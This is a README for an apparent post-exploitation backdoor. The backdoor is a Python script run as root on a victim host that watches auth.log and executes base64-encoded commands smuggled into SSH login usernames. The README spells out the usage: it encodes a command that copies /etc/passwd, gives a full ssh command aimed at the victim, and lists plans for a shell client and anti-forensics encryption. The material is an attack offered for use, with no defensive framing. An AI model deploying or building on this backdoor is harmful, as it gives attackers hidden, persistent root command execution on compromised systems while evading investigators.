# ssh-authlog-backdoor

A post exploit python script that watches auth.log for a keyword then executes base64 encoded commands.  


## How to use

1. Execute the script as root on the victim box.

2. Encode a command in base64 by using an online service or how ever you can get base64. https://www.base64encode.org/
   Example
   ``` cat /etc/passwd > /tmp/test ```
   is
   ```Y2F0IC9ldGMvcGFzc3dkID4gL3RtcC90ZXN0```
3. From an attacking box initiate an ssh connection as the user ```shadow---``` + ```base64 encoded command```
   Full example ```ssh shadow---Y2F0IC9ldGMvcGFzc3dkID4gL3RtcC90ZXN0@VICTIM.IP``` 
   
 
### TODO
1. Make client to run on attacker box that can handel responces sent out by backdoor. (Semi-interactive shel)
2. Use better encoding/encryption on commands to aid in anti-forensics 
